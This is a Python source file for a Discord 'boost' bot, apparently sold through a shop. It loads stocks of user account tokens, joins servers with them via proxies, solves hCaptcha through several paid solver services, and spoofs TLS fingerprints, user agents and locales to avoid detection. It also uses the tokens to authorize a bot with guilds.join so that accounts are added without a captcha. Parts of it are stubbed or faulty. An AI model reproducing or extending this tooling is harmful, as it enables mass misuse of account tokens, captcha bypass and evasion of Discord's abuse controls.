import authsystem
import db

import os
import re
import token
import time
from time import sleep
import toml
import aiohttp
import base64

bannerc = "     \x1b[38;5;87m"
L1 = "\x1b[38;5;177m"
L = "\x1b[38;5;97m"

def create_folder(folder_path):
    if not os.path.exists(folder_path):
        os.makedirs(folder_path)
        print(f"Folder '{folder_path}' created.")

def create_file(file_path):
    if not os.path.exists(file_path):
        with open(file_path, 'w') as f:
            f.write('')
        print(f"File '{file_path}' created.")

def setup_folders_and_files():
    paths = {
        'keys_folder': 'data/keys',
        'keys_file': 'data/keys/keys.json',
        'used_keys_file': 'data/keys/used_keys.json',
        'output_folder': 'data/output',
        'success_file': 'data/output/success.txt',
        'failed_boosts_file': 'data/output/failed_boosts.txt',
        'captcha_file': 'data/output/captcha.txt',
        'data_folder': 'data',
        'one_million_file': 'data/1m.txt',
        'three_month_file': 'data/3m.txt',
        'proxies_file': 'data/proxies.txt'
    }

    create_folder(paths['data_folder'])
    create_folder(paths['keys_folder'])
    create_folder(paths['output_folder'])
    create_file(paths['keys_file'])
    create_file(paths['used_keys_file'])
    create_file(paths['success_file'])
    create_file(paths['failed_boosts_file'])
    create_file(paths['captcha_file'])
    create_file(paths['one_million_file'])
    create_file(paths['three_month_file'])
    create_file(paths['proxies_file'])
    if not os.path.exists('data/oauth_tokens.json'):
        with open('data/oauth_tokens.json', 'w') as f:
            f.write('{}')

setup_folders_and_files()

from discord_webhook import DiscordWebhook, DiscordEmbed
from threading import Thread
import discord
from websockets.exceptions import ConnectionClosedError
from enum import Enum, IntEnum
from discord.interactions import Interaction
from typing import Dict, List, Optional, Tuple, Union
from discord.ui import button
import json, httpx, tls_client, threading, time, random, hashlib, sys, os
from discord.ui.item import Item
from flask import request, Flask, jsonify
from discord.ui import Modal, TextInput
from discord.ext import commands
import requests
from base64 import b64encode
from discord import app_commands
from json.decoder import JSONDecodeError
import websockets
from websockets.sync.client import connect as ws_sync_connect
import os
import logging
from pymongo import MongoClient
from colorama import Fore, Style
from fastapi import FastAPI, File, Form, UploadFile, Request
from fastapi.params import Body
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
import uuid as _uuid
import datetime
from uvicorn import run
from concurrent.futures import ThreadPoolExecutor
bot = commands.Bot( command_prefix=",", intents=discord.Intents.all())
class Fore:
    BLACK = "\033[30m"
    RED = "\033[31m"
    GREEN = "\033[32m"
    YELLOW = "\033[33m"
    BLUE = "\033[34m"
    MAGENTA = "\033[35m"
    CYAN = "\033[36m"
    WHITE = "\033[37m"
    UNDERLINE = "\033[4m"
    RESET = "\033[0m"


logging.basicConfig(level=logging.INFO, datefmt='%H:%M')
logging.addLevelName(logging.INFO, f'{L}[{Fore.WHITE}#{L}]{L1} |{Style.RESET_ALL}')
logging.addLevelName(logging.ERROR, f'{L}[{Fore.RED}-{L}]{L1} |{Style.RESET_ALL}')
logging.addLevelName(logging.WARNING, f'{L}[{Fore.YELLOW}WARNING{L}]{L1} |{Style.RESET_ALL}')
config = json.load(open("config/config.json", encoding="utf-8"))
oconfig = json.load(open("config/onliner.json", encoding="utf-8"))
logging.basicConfig(level=logging.INFO)

# ── Secrets loader (priority: env var → secrets.json → config.json) ──────────
_SECRETS_FILE = "config/secrets.json"

def _load_secrets_file() -> dict:
    try:
        if os.path.exists(_SECRETS_FILE):
            return json.load(open(_SECRETS_FILE, encoding="utf-8"))
    except Exception:
        pass
    return {}

def _save_secrets_file(data: dict):
    os.makedirs("config", exist_ok=True)
    with open(_SECRETS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4)

_secrets = _load_secrets_file()

def _secret(key: str) -> str:
    """Read from: env var → secrets.json → empty string"""
    return os.environ.get(key) or _secrets.get(key) or ""

def _apply_secrets_to_config():
    """Apply all secrets to the in-memory config dict."""
    global webhook_url
    if _secret("BOT_TOKEN"):
        config["token"] = _secret("BOT_TOKEN")
    if _secret("BOT_CLIENT_SECRET"):
        config["bot_client_secret"] = _secret("BOT_CLIENT_SECRET")
    if _secret("WEBHOOK_URL"):
        config["webhook_url"] = _secret("WEBHOOK_URL")
        webhook_url = config["webhook_url"]
    if _secret("PANEL_PASSWORD"):
        config["panel_password"] = _secret("PANEL_PASSWORD")
    if _secret("CHECKER_PASSWORD"):
        config["checker_password"] = _secret("CHECKER_PASSWORD")
    if _secret("CAPSOLVER_API_KEY"):
        config.setdefault("captcha_solver", {})["capsolver_api_key"] = _secret("CAPSOLVER_API_KEY")
    if _secret("VOIDSOLVER_API_KEY"):
        config.setdefault("captcha_solver", {})["voidsolver_api_key"] = _secret("VOIDSOLVER_API_KEY")
    if _secret("ANTICAPTCHA_API_KEY"):
        config.setdefault("captcha_solver", {})["anticaptcha_api_key"] = _secret("ANTICAPTCHA_API_KEY")
    if _secret("KOVASOLVER_API_KEY"):
        config.setdefault("captcha_solver", {})["kovasolver_api_key"] = _secret("KOVASOLVER_API_KEY")
    if _secret("SELLPASS_API_KEY"):
        config.setdefault("sellpass", {})["api_key"] = _secret("SELLPASS_API_KEY")

_apply_secrets_to_config()

webhook_url = config['webhook_url']
use_log = config['use_log']
def send_webhook_message(webhook_url, content, embed):
    webhook = DiscordWebhook(url=webhook_url, content=content)
    webhook.add_embed(embed)
    response = webhook.execute()
    if response.status_code in [200, 201, 202, 203, 204, 205, 206, 207]:
        pass
    else:
        logging.error(f"Failed to send message. Status code: {response.status_code}")


# Boost command
@bot.command()
async def boost2(ctx, invite_code: str):
    tokens = db.getStock_db("1m")

    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = [executor.submit(join_server, token, invite_code) for token in tokens]
        for future in futures:
            future.result()
    await ctx.send(f"Boost process started for invite code: {invite_code}")

powerboosts = rf"""{Fore.GREEN}

 _______                                   __            _______               __     
/       \                                 /  |          /       \             /  |    
$$$$$$$  |  ______    ______    _______  _$$ |_         $$$$$$$  |  ______   _$$ |_   
$$ |__$$ | /      \  /      \  /       |/ $$   |        $$ |__$$ | /      \ / $$   |  
$$    $$< /$$$$$$  |/$$$$$$  |/$$$$$$$/ $$$$$$/         $$    $$< /$$$$$$  |$$$$$$/   
$$$$$$$  |$$ |  $$ |$$ |  $$ |$$      \   $$ | __       $$$$$$$  |$$ |  $$ |  $$ | __ 
$$ |__$$ |$$ \__$$ |$$ \__$$ | $$$$$$  |  $$ |/  |      $$ |__$$ |$$ \__$$ |  $$ |/  |
$$    $$/ $$    $$/ $$    $$/ /     $$/   $$  $$/       $$    $$/ $$    $$/   $$  $$/ 
$$$$$$$/   $$$$$$/   $$$$$$/  $$$$$$$/     $$$$/        $$$$$$$/   $$$$$$/     $$$$/  

                            
{Fore.RESET}"""

gradient_colors = [bannerc]

def animate_gradient():
    for i in range(len(gradient_colors) * 2):
        print("\033c", end="", flush=True)
        for line in powerboosts.split('\n'):
            gradient_index = i % len(gradient_colors)
            print(f"{gradient_colors[gradient_index]}{line}{Fore.RESET}")
        time.sleep(0.05)

animation_thread = threading.Thread(target=animate_gradient)
animation_thread.start()
animation_thread.join()

class DiscordWebSocket:
    def __init__(self, *args, **kwargs):
        self.initialize_websocket(*args, **kwargs)

    def initialize_websocket(self, *args, **kwargs):
        # Implementation of websocket_instance
        print("initialize_websocket method called")
        # Add your actual implementation here

    def websocket_instance(self, *args, **kwargs):
        print("websocket_instance method called")
        # Add your actual implementation here

def log_error(error_message):
    log_directory = "database"
    log_file = "errors.txt"
    if not os.path.exists(log_directory):
        os.makedirs(log_directory)
    with open(os.path.join(log_directory, log_file), "a") as file:
        file.write(error_message + "\n")

# Example usage
try:
    socket = DiscordWebSocket()
except Exception as e:
    log_error(f"Error creating DiscordWebSocket instance: {e}")

# Ensure to properly terminate any additional threads or processes here before interpreter shutdown


class MyCog(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    async def load_persistent_view(self):
        return PanelView(), AutoView()


def get_checksum():
    sha256_hash = hashlib.sha256()
    with open(''.join(sys.argv), "rb") as file:
        sha256_hash.update(file.read())
    return sha256_hash.hexdigest()

def detect_unusual_text(text):
    pattern = re.compile(r'\b\w+\s\w+\b')  
    
    if pattern.search(text):
        return True
    return False

def check_file_for_unusual_text(file_path):
    with open(file_path, 'r') as file:
        for line_number, line in enumerate(file, 1):
            if detect_unusual_text(line):
                content="It's just a warning and you can ignore it if it's not valid and if possible report in leon shop support server! "
                if webhook_url != "" and use_log == True:
                    embed = DiscordEmbed(title="**Boosting Data**", description=f"Please make sure to check {file_path} \n **Error** \n  ``` Invalid text detected in line {line_number}: {line.strip()} ``` \n [ Use /get_tokens to get the tokens and check them and after that use /clean_token_file and clean the token files and readd the tokens ]", color=0x2F3136)
                    send_webhook_message(webhook_url, content, embed)
                return True
            else : 
                pass
                return False

try:
    for _fp in ['data/1m.txt', 'data/3m.txt']:
        if os.path.exists(_fp):
            check_file_for_unusual_text(_fp)
except Exception:
    pass
api_key = config['captcha_solver'].get('hcoptcha_api_key', '')
cs_api_key = config['captcha_solver'].get('capsolver_api_key', '')
csolver = config['captcha_solver'].get('capsolver_api_key', '')
vs_api_key = config['captcha_solver'].get('voidsolver_api_key', '')
ac_api_key = config['captcha_solver'].get('anticaptcha_api_key', '')
kv_api_key = config['captcha_solver'].get('kovasolver_api_key', '')

h_proxy = None


class Status(Enum):
    ONLINE = "online" 
    DND = "dnd"  
    IDLE = "idle" 
    INVISIBLE = "invisible"  
    OFFLINE = "offline" 


class Activity(Enum):
    GAME = 0  
    STREAMING = 1  
    LISTENING = 2  
    WATCHING = 3  
    CUSTOM = 4  
    COMPETING = 5 


class OPCodes(Enum):
    Dispatch = 0  
    Heartbeat = 1
    Identify = 2 
    PresenceUpdate = 3
    VoiceStateUpdate = 4
    Resume = 6  
    Reconnect = 7  
    RequestGuildMembers = (
        8  
    )
    InvalidSession = 9  
    Hello = (
        10  
    )
    HeartbeatACK = 11 


class DiscordIntents(IntEnum):
    GUILDS = 1 << 0
    GUILD_MEMBERS = 1 << 1
    GUILD_MODERATION = 1 << 2
    GUILD_EMOJIS_AND_STICKERS = 1 << 3
    GUILD_INTEGRATIONS = 1 << 4
    GUILD_WEBHOOKS = 1 << 5
    GUILD_INVITES = 1 << 6
    GUILD_VOICE_STATES = 1 << 7
    GUILD_PRESENCES = 1 << 8
    GUILD_MESSAGES = 1 << 9
    GUILD_MESSAGE_REACTIONS = 1 << 10
    GUILD_MESSAGE_TYPING = 1 << 11
    DIRECT_MESSAGES = 1 << 12
    DIRECT_MESSAGE_REACTIONS = 1 << 13
    DIRECT_MESSAGE_TYPING = 1 << 14
    MESSAGE_CONTENT = 1 << 15
    GUILD_SCHEDULED_EVENTS = 1 << 16
    AUTO_MODERATION_CONFIGURATION = 1 << 20
    AUTO_MODERATION_EXECUTION = 1 << 21


class Presence:
    def __init__(self, online_status: Status) -> None:
        self.online_status: Status = online_status
        self.activities: List[Activity] = []

    def addActivity(
        self, name: str, activity_type: Activity, url: Optional[str]
    ) -> int:

        self.activities.append(
            {
                "name": name,
                "type": activity_type.value, 
                "url": url if activity_type == Activity.STREAMING else None,
            }
        )
        return len(self.activities) - 1

    def removeActivity(self, index: int) -> bool:
        if index < 0 or index >= len(self.activities):
            return False
        self.activities.pop(index)
        return True
class AvatarSocket:
    def __init__(self) -> None:
        self.websocket_instance(
            "wss://gateway.discord.gg/?v=10&encoding=json"
        )
        self.heartbeat_counter = 0

        self.username: str = None
        self.required_action: str = None
        self.heartbeat_interval: int = None
        self.last_heartbeat: float = None

    def get_heatbeat_interval(self) -> None:
        resp: Dict = json.loads(self.websocket_instance.recv())
        self.heartbeat_interval = resp["d"]["heartbeat_interval"]

    def authenticate(self, token: str, rich) -> Union[Dict, bool]:
        self.websocket_instance.send(
            json.dumps(
                {
                    "op": OPCodes.Identify.value,
                    "d": {
                        "token": token,
                        "intents": DiscordIntents.GUILD_MESSAGES
                        | DiscordIntents.GUILDS,  
                        "properties": {
                            "os": "linux",  
                            "browser": "Brave",  
                            "device": "Desktop",
                        },
                        "presence": {
                            "activities": [
                                activity for activity in rich.activities
                            ],  
                            "status": rich.online_status.value,  
                            "since": time.time(),  
                            "afk": False, 
                        },
                    },
                }
            )
        )
        try:
            resp = json.loads(self.websocket_instance.recv())
            self.username: str = resp["d"]["user"]["username"]
            self.required_action = resp["d"].get("required_action")
            self.heartbeat_counter += 1
            self.last_heartbeat = time.time()

            return resp
        except ConnectionClosedError:
            return False

    def send_heartbeat(self) -> websockets.typing.Data:
        self.websocket_instance.send(
            json.dumps(
                {"op": OPCodes.Heartbeat.value, "d": None}
            ) 
        )

        self.heartbeat_counter += 1
        self.last_heartbeat = time.time()

        resp = self.websocket_instance.recv()
        return resp
    

    def avatar_socket(token: str, activity: Presence):
        socket = DiscordWebSocket()
        socket.get_heatbeat_interval()

        auth_resp = socket.authenticate(token, activity)

        if not auth_resp:
            return
        while True:
            try:
                if (
                    time.time() - socket.last_heartbeat
                    >= (socket.heartbeat_interval / 1000) - 5
                ):  
                    resp = socket.send_heartbeat()
                time.sleep(0.5)
            except IndentationError:
                print(resp)
    def run_socket(self, token):
        with open("config/onliner.json", "r") as config_file:
            config: Dict[str, Union[List[str], Dict[str, List[str]]]] = json.loads(config_file.read())

        activity_types: List[Activity] = [
            Activity[x.upper()] for x in config["choose_random_activity_type_from"]
        ]
        online_statuses: List[Status] = [
            Status[x.upper()] for x in config["choose_random_online_status_from"]
        ]
        online_status = random.choice(online_statuses)
        chosen_activity_type = random.choice(activity_types)
        url = None

        if chosen_activity_type:
            if Activity.GAME:
                name = random.choice(config["game"]["choose_random_game_from"])

            elif Activity.STREAMING:
                name = random.choice(config["streaming"]["choose_random_name_from"])
                url = random.choice(config["streaming"]["choose_random_url_from"])

            elif Activity.LISTENING:
                name = random.choice(config["listening"]["choose_random_name_from"])

            elif Activity.WATCHING:
                name = random.choice(config["watching"]["choose_random_name_from"])

            elif Activity.CUSTOM:
                name = random.choice(config["custom"]["choose_random_name_from"])

            elif Activity.COMPETING:
                name = random.choice(config["competing"]["choose_random_name_from"])

        activity = Presence(online_status)
        activity.addActivity(activity_type=chosen_activity_type, name=name, url=url)
        x = Thread(target=main, args=(token, activity))
        x.start()
# avatar changer websocket end

try:
    h_proxy = db.get_random_proxy()
except:
    h_proxy=None
def h_captcha(sitekey, url, rqdata):
    try:
        p1 = {
            "task_type": "hcaptchaEnterprise",
            "api_key": f"{api_key}",
            "data": {
                "sitekey": sitekey,
                "url": url,
                "rqdata": rqdata,
                "proxy": h_proxy,
            },
        }
        h1 = {"Content-Type": "application/json"}
        r1 = requests.post("https://api.hcoptcha.online/api/createTask", headers=h1, json=p1, timeout=15)
        data = r1.json()
        if not data.get('error'):
            return data.get('task_id', False)
        else:
            logging.error(f"hcoptcha: Unable to create task: {data}")
            return False
    except Exception as e:
        logging.error(f"hcoptcha: Exception creating task: {e}")
        return False

def encoded(path: str):
        try:
            with open(path + random.choice(os.listdir(path)), "rb") as f:
                img = f.read()
            return f'data:image/png;base64,{b64encode(img).decode("ascii")}'
        except Exception as e:
            logging.error(f'Encoding Error: {str(e).capitalize()}')
            pass

def h_result(task_id):
    try:
        p2 = {"api_key": f"{api_key}", "task_id": task_id}
        h2 = {"Content-Type": "application/json"}
        r2 = requests.post("https://api.hcoptcha.com/api/getTaskData", headers=h2, json=p2, timeout=15)
        data = r2.json()
        if 'captcha_key' in r2.text:
            return data
        else:
            if config.get('advance_mode'):
                logging.error(f"hcoptcha: Unable to get solution: {data}")
            return False
    except Exception as e:
        logging.error(f"hcoptcha: Exception getting result: {e}")
        return False


def cs_captcha(sitekey, url, rqdata=None):
    if not cs_api_key:
        logging.error("CapSolver: API key not configured")
        return False
    try:
        task = {
            "type": "HCaptchaTaskProxyLess",
            "websiteKey": sitekey,
            "websiteURL": url,
        }
        if rqdata:
            task["enterprisePayload"] = {"rqdata": rqdata}
        p1 = {"clientKey": cs_api_key, "task": task}
        h1 = {"Content-Type": "application/json"}
        r1 = requests.post("https://api.capsolver.com/createTask", headers=h1, json=p1, timeout=15)
        data = r1.json()
        if data.get('errorId') == 0:
            task_id = data.get('taskId')
            logging.info(f"CapSolver: Task created — {task_id}")
            return task_id
        else:
            logging.error(f"CapSolver: Unable to create task: {data}")
            return False
    except Exception as e:
        logging.error(f"CapSolver: Exception creating task: {e}")
        return False

def cs_result(task_id):
    try:
        p2 = {"clientKey": cs_api_key, "taskId": task_id}
        h2 = {"Content-Type": "application/json"}
        for attempt in range(24):
            time.sleep(5)
            r2 = requests.post("https://api.capsolver.com/getTaskResult", headers=h2, json=p2, timeout=15)
            data = r2.json()
            if data.get('errorId') != 0:
                logging.error(f"CapSolver: Error getting result: {data}")
                return False
            status = data.get('status')
            if status == 'ready':
                logging.info(f"CapSolver: Solved (attempt {attempt+1}/24)")
                return data
            if config.get('advance_mode'):
                logging.info(f"CapSolver: Waiting (attempt {attempt+1}/24): {status}")
        logging.error("CapSolver: Max polling attempts reached")
        return False
    except Exception as e:
        logging.error(f"CapSolver: Exception getting result: {e}")
        return False

def vs_captcha(sitekey, url, rqdata=None, user_agent=None, proxy=None):
    if not vs_api_key:
        logging.error("VoidSolver: API key not configured")
        return False
    if not sitekey or not url:
        logging.error(f"VoidSolver: Missing sitekey or url (sitekey={sitekey}, url={url})")
        return False
    try:
        h1 = {"Authorization": f"Bearer {vs_api_key}", "Content-Type": "application/json"}
        p1 = {"site_url": url, "site_key": sitekey}
        if rqdata:
            p1["rqdata"] = rqdata
        r1 = requests.post("https://api.voidsolver.tech/createtask", headers=h1, json=p1, timeout=15)
        if not r1.text.strip():
            logging.error("VoidSolver: Empty response from createtask")
            return False
        resp = r1.json()
        task_id = resp.get('taskId')
        if task_id:
            logging.info(f"VoidSolver: Task created — {task_id}")
            return task_id
        else:
            logging.error(f"VoidSolver: Unable to create task: {r1.text}")
            return False
    except Exception as e:
        logging.error(f"VoidSolver: Exception creating task: {e}")
        return False

def vs_result(task_id):
    h2 = {"Authorization": f"Bearer {vs_api_key}", "Content-Type": "application/json"}
    for attempt in range(20):
        time.sleep(5)
        try:
            r2 = requests.get(
                f"https://api.voidsolver.tech/getTaskResult?taskid={task_id}",
                headers=h2,
                timeout=15,
            )
            if not r2.text.strip():
                continue
            data = r2.json()
            st = data.get('status')
            if st == 'success':
                return data
            if st in ('failed', 'error'):
                logging.error(f"VoidSolver: Task {task_id} failed — {data}")
                return False
            if config.get('advance_mode'):
                logging.info(f"VoidSolver: Waiting for solution (attempt {attempt+1}/20): {st}")
        except Exception as e:
            logging.error(f"VoidSolver: Exception getting result: {e}")
    logging.error("VoidSolver: Max polling attempts reached, solution not ready")
    return False

def kv_captcha(sitekey, url, rqdata=None):
    if not kv_api_key:
        logging.error("KovaSolver: API key not configured")
        return False
    try:
        payload = {"website_url": url, "website_key": sitekey}
        if rqdata:
            payload["rqdata"] = rqdata
        h1 = {"X-Api-Key": kv_api_key, "Content-Type": "application/json"}
        r1 = requests.post("https://kovasolver.com/create-task", headers=h1, json=payload, timeout=15)
        if r1.status_code != 200:
            logging.error(f"KovaSolver: HTTP {r1.status_code}: {r1.text[:200]}")
            return False
        data = r1.json()
        task_id = data.get("task_id")
        if task_id:
            logging.info(f"KovaSolver: Task created — {task_id}")
            return task_id
        else:
            logging.error(f"KovaSolver: Unable to create task: {data}")
            return False
    except Exception as e:
        logging.error(f"KovaSolver: Exception creating task: {e}")
        return False

def kv_result(task_id):
    try:
        h2 = {"X-Api-Key": kv_api_key}
        for attempt in range(24):
            time.sleep(5)
            r2 = requests.get(f"https://kovasolver.com/task-result/{task_id}", headers=h2, timeout=15)
            if r2.status_code != 200:
                logging.error(f"KovaSolver: HTTP {r2.status_code}: {r2.text[:200]}")
                return False
            data = r2.json()
            status = data.get("status")
            if status == "solved":
                logging.info(f"KovaSolver: Solved (attempt {attempt+1}/24)")
                return data
            if status in ("failed", "error"):
                logging.error(f"KovaSolver: Task failed — {data}")
                return False
            if config.get('advance_mode'):
                logging.info(f"KovaSolver: Waiting (attempt {attempt+1}/24): {status}")
        logging.error("KovaSolver: Max polling attempts reached")
        return False
    except Exception as e:
        logging.error(f"KovaSolver: Exception getting result: {e}")
        return False

def ac_captcha(sitekey, url, rqdata=None):
    if not ac_api_key:
        logging.error("AntiCaptcha: API key not configured")
        return False
    try:
        task = {
            "type": "HCaptchaTaskProxyless",
            "websiteURL": url,
            "websiteKey": sitekey,
        }
        if rqdata:
            task["enterprisePayload"] = {"rqdata": rqdata}
        p1 = {"clientKey": ac_api_key, "task": task}
        h1 = {"Content-Type": "application/json"}
        r1 = requests.post("https://api.anti-captcha.com/createTask", headers=h1, json=p1, timeout=15)
        data = r1.json()
        if data.get("errorId") == 0:
            task_id = data.get("taskId")
            logging.info(f"AntiCaptcha: Task created — {task_id}")
            return task_id
        else:
            logging.error(f"AntiCaptcha: Unable to create task: {data}")
            return False
    except Exception as e:
        logging.error(f"AntiCaptcha: Exception creating task: {e}")
        return False

def ac_result(task_id):
    try:
        p2 = {"clientKey": ac_api_key, "taskId": task_id}
        h2 = {"Content-Type": "application/json"}
        for attempt in range(24):
            time.sleep(5)
            r2 = requests.post("https://api.anti-captcha.com/getTaskResult", headers=h2, json=p2, timeout=15)
            data = r2.json()
            if data.get("errorId") != 0:
                logging.error(f"AntiCaptcha: Error getting result: {data}")
                return False
            status = data.get("status")
            if status == "ready":
                logging.info(f"AntiCaptcha: Solved (attempt {attempt+1}/24)")
                return data
            if config.get('advance_mode'):
                logging.info(f"AntiCaptcha: Waiting (attempt {attempt+1}/24): {status}")
        logging.error("AntiCaptcha: Max polling attempts reached")
        return False
    except Exception as e:
        logging.error(f"AntiCaptcha: Exception getting result: {e}")
        return False

import urllib.parse as _urllib_parse

_oauth_tokens_lock = threading.Lock()

def get_oauth_token_from_user(user_token):
    """Authorize a user token to the bot's OAuth app and return an (access_token, expires_in) tuple."""
    client_id = config.get("bot_client_id", "")
    client_secret = config.get("bot_client_secret", "")
    redirect_uri = config.get("oauth_redirect_uri", "https://discord.com")
    if not client_id or not client_secret:
        logging.error("OAuth: bot_client_id / bot_client_secret not set in config.json")
        return None, None
    raw = user_token.split(":")[2] if user_token.count(":") >= 2 else user_token
    hdrs = {
        "Authorization": raw,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    }
    try:
        r = requests.post(
            "https://discord.com/api/v9/oauth2/authorize",
            params={"client_id": client_id, "response_type": "code", "scope": "guilds.join", "redirect_uri": redirect_uri},
            headers=hdrs,
            json={"authorize": True, "permissions": "0"},
            timeout=15,
        )
        if r.status_code != 200:
            logging.error(f"OAuth authorize failed ({r.status_code}): {r.text[:120]}")
            return None, None
        location = r.json().get("location", "")
        parsed = _urllib_parse.urlparse(location)
        code = _urllib_parse.parse_qs(parsed.query).get("code", [None])[0]
        if not code:
            logging.error(f"OAuth: no code in location: {location[:120]}")
            return None, None
    except Exception as e:
        logging.error(f"OAuth authorize exception: {e}")
        return None, None
    try:
        r2 = requests.post(
            "https://discord.com/api/v10/oauth2/token",
            data={
                "client_id": client_id,
                "client_secret": client_secret,
                "grant_type": "authorization_code",
                "code": code,
                "redirect_uri": redirect_uri,
            },
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            timeout=15,
        )
        if r2.status_code != 200:
            logging.error(f"OAuth token exchange failed ({r2.status_code}): {r2.text[:120]}")
            return None, None
        d = r2.json()
        return d.get("access_token"), d.get("expires_in", 604800)
    except Exception as e:
        logging.error(f"OAuth token exchange exception: {e}")
        return None, None

def get_stored_oauth_token(raw_token):
    """Return a cached OAuth access token for raw_token if still valid (< 6 days old)."""
    return db.get_stored_oauth(raw_token)

def store_oauth_token(raw_token, user_id, access_token):
    """Cache an OAuth access token keyed by raw user token."""
    db.store_oauth(raw_token, user_id, access_token)

def check_guild_accessible(guild_id):
    """Return True if the bot is currently a member of guild_id."""
    try:
        r = requests.get(
            f"https://discord.com/api/v9/guilds/{guild_id}",
            headers={"Authorization": f"Bot {config.get('token','')}"},
            timeout=10,
        )
        return r.status_code == 200
    except Exception:
        return False

def get_bot_invite_url():
    """Build a Discord OAuth2 invite URL for the bot with required permissions."""
    client_id = config.get("bot_client_id", "")
    if not client_id:
        return None
    return (
        f"https://discord.com/oauth2/authorize"
        f"?client_id={client_id}"
        f"&scope=bot"
        f"&permissions=8"
    )

def wh_log(title, description, color=0x7c3aed):
    """Send a log embed to the configured webhook if logging is enabled."""
    if webhook_url and use_log:
        try:
            embed = DiscordEmbed(title=title, description=description, color=color)
            send_webhook_message(webhook_url, "", embed)
        except Exception as e:
            logging.error(f"wh_log failed: {e}")

def add_member_to_guild(guild_id, user_id, access_token):
    """Use bot authority + user OAuth access_token to add user to guild (no captcha)."""
    try:
        r = requests.put(
            f"https://discord.com/api/v9/guilds/{guild_id}/members/{user_id}",
            headers={"Authorization": f"Bot {config.get('token','')}", "Content-Type": "application/json"},
            json={"access_token": access_token},
            timeout=15,
        )
        return r.status_code in (201, 204)
    except Exception as e:
        logging.error(f"add_member_to_guild exception: {e}")
        return False

def authorize_tokens_batch(token_lines):
    """Pre-authorize tokens via OAuth and cache access tokens. Skips already-cached ones."""
    if not config.get("bot_client_id") or not config.get("bot_client_secret"):
        logging.info("OAuth pre-auth skipped: bot_client_id / bot_client_secret not configured")
        return
    results = {"ok": 0, "fail": 0}
    def _auth(line):
        raw = line.split(":")[2] if line.count(":") >= 2 else line.strip()
        if not raw:
            return
        if get_stored_oauth_token(raw):
            results["ok"] += 1
            return
        try:
            me = requests.get("https://discord.com/api/v9/users/@me",
                headers={"Authorization": raw, "User-Agent": "Mozilla/5.0"}, timeout=10)
            if me.status_code != 200:
                results["fail"] += 1
                return
            user_id = me.json().get("id")
        except Exception:
            results["fail"] += 1
            return
        access_token, _ = get_oauth_token_from_user(raw)
        if access_token and user_id:
            store_oauth_token(raw, user_id, access_token)
            results["ok"] += 1
        else:
            results["fail"] += 1
    from concurrent.futures import ThreadPoolExecutor
    with ThreadPoolExecutor(max_workers=3) as ex:
        ex.map(_auth, token_lines)
    logging.info(f"OAuth pre-auth complete: {results['ok']} authorized, {results['fail']} failed")

class Booster:
    def __init__(self) -> None:
        self.proxy = self.getProxy()
        self.crome_v = f'Chrome_{str(random.randint(110, 118))}'
        self.client = tls_client.Session(
            client_identifier=self.crome_v,
            random_tls_extension_order=True,
            ja3_string='771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,18-23-45-11-27-10-0-5-13-65037-16-51-17513-43-35-65281-41,25497-29-23-24,0',            
        )
        self.locale = random.choice(["af", "af-NA", "af-ZA", "agq", "agq-CM", "ak", "ak-GH", "am", "am-ET", "ar", "ar-001", "ar-AE", "ar-BH", "ar-DJ", "ar-DZ", "ar-EG", "ar-EH", "ar-ER", "ar-IL", "ar-IQ", "ar-JO", "ar-KM", "ar-KW", "ar-LB", "ar-LY", "ar-MA", "ar-MR", "ar-OM", "ar-PS", "ar-QA", "ar-SA", "ar-SD", "ar-SO", "ar-SS", "ar-SY", "ar-TD", "ar-TN", "ar-YE", "as", "as-IN", "asa", "asa-TZ", "ast", "ast-ES", "az", "az-Cyrl", "az-Cyrl-AZ", "az-Latn", "az-Latn-AZ", "bas", "bas-CM", "be", "be-BY", "bem", "bem-ZM", "bez", "bez-TZ", "bg", "bg-BG", "bm", "bm-ML", "bn", "bn-BD", "bn-IN", "bo", "bo-CN", "bo-IN", "br", "br-FR", "brx", "brx-IN", "bs", "bs-Cyrl", "bs-Cyrl-BA", "bs-Latn", "bs-Latn-BA", "ca", "ca-AD", "ca-ES", "ca-FR", "ca-IT", "ccp", "ccp-BD", "ccp-IN", "ce", "ce-RU", "cgg", "cgg-UG", "chr", "chr-US", "ckb", "ckb-IQ", "ckb-IR", "cs", "cs-CZ", "cy", "cy-GB", "da", "da-DK", "da-GL", "dav", "dav-KE", "de", "de-AT", "de-BE", "de-CH", "de-DE", "de-IT", "de-LI", "de-LU", "dje", "dje-NE", "dsb", "dsb-DE", "dua", "dua-CM", "dyo", "dyo-SN", "dz", "dz-BT", "ebu", "ebu-KE", "ee", "ee-GH", "ee-TG", "el", "el-CY", "el-GR", "en", "en-001", "en-150", "en-AG", "en-AI", "en-AS", "en-AT", "en-AU", "en-BB", "en-BE", "en-BI", "en-BM", "en-BS", "en-BW", "en-BZ", "en-CA", "en-CC", "en-CH", "en-CK", "en-CM", "en-CX", "en-CY", "en-DE", "en-DG", "en-DK", "en-DM", "en-ER", "en-FI", "en-FJ", "en-FK", "en-FM", "en-GB", "en-GD", "en-GG"])

        self.useragent = f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) {self.crome_v}.0.0.0 Safari/537.36'
        self.failed = []
        self.success = []
        self.captcha = []
        self.getX()
        self.fingerprints()
        self.proxy = self.getProxy()

    def getX(self):
        properties = {
            "os": 'Windows',
            "browser": 'Chrome',
            "device": "",
            "system_locale": self.locale,
            "browser_user_agent": self.useragent,
            "browser_version": f'{self.crome_v}.0.0.0',
            "os_version": "10",
            "referrer": "",
            "referring_domain": "",
            "referrer_current": "",
            "referring_domain_current": "",
            "release_channel": "stable",
            "client_build_number": 236850,
            "client_event_source": None
        }

        self.x = b64encode(json.dumps(properties, separators=(',', ':')).encode("utf-8")).decode()

    def getProxy(self):
        try:
            proxy = db.get_random_proxy()
            if proxy:
                return {"http": f"http://{proxy}", "https": f"http://{proxy}"}
        except Exception:
            pass
        return None

    def fingerprints(self):
        headers = {
            "authority": "discord.com",
            "method": "GET",
            "path": "/api/v9/experiments",
            "scheme": "https",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "Accept-Encoding": "gzip, deflate, br",
